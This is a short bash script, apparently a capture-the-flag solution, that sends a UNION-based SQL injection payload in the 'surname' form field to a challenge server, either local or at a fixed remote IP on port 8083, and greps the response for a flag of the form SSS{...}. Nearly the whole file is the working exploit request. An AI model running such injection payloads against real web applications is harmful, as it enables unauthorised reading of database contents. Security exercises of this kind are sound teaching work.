#!/bin/bash
PORT=8083

if [[ $1 == "local" ]]
then
    url='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]] 
then
    url='http://141.85.224.118:'$PORT
else
    url=$1':'$2
fi

# Demo
echo "Start exploit for Demo"
flag=$(curl -s $url --data-raw "surname=admin' UNION select v,null,null from flags -- " | grep -o "SSS{.*}")
echo "Flag is $flag"
echo "----------------------------"
